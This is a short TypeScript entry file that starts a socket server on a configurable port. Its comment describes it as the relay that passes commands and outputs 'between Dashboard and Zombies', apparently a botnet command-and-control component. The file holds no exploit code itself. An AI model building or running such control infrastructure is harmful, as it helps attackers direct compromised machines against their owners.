import SocketServer from "./core/SocketServer";
import 'dotenv/config'


/**
 * @module VeparServer - 'The middle module'
 * @description This module of Vepar is used to receive commands and manage outputs
 *              between Dashboard and Zombies
 * @copyright UsboKirishima <usbertibox@gmail.com>
 * 
 */

const PORT = process.env.PORT ? Number(process.env.PORT) : 3000;
new SocketServer(PORT);